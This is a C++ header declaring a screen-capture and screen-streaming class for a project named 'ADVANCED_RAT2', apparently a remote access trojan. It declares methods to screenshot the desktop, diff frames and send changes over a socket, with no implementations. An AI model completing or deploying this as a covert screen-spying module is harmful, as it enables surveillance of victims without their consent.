//
// Created by avita on 09/08/2020.
//


#ifndef ADVANCED_RAT2_SHARESCREEN_H
#define ADVANCED_RAT2_SHARESCREEN_H


#include <iostream>



#include <WS2tcpip.h>
#include <windows.h>
#include <GdiPlus.h>



#include <memory>


#pragma warning(disable:4996)
#pragma comment(lib, "ws2_32.lib")
#pragma comment( lib, "gdiplus" )


using namespace std;
using namespace Gdiplus;

static const int Height = GetSystemMetrics(SM_CYSCREEN);
static const int Width = GetSystemMetrics(SM_CXSCREEN);

class ShareScreen {

    //If false insertColor on img1 if true insertColor on img2
    bool change = false;


    //Images
    Color** img1[1440][2580];
    Color** img2[1440][2580];

public:

    //Constructor
    ShareScreen();

    //Taking screenshot
    void takeScreenShot();

    //Help function to takeScreenShot
    int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);


    //Insert to any pixel in pixels a color from img1 or img2
    void insertColor(Bitmap& bitmap, Color** pixels[1440][2580]);

    //Comparing two images and returning the bytes that changed
    Color** compareImages(Color** img1[1440][2580], Color** img2[1440][2580]);

    SOCKET socket;

    //Screen sharing in the first time sending img1 and after sending the bytes that changed between img1 and img2
    void ShareScreenLive(SOCKET socket);

};


#endif //ADVANCED_RAT2_SHARESCREEN_H
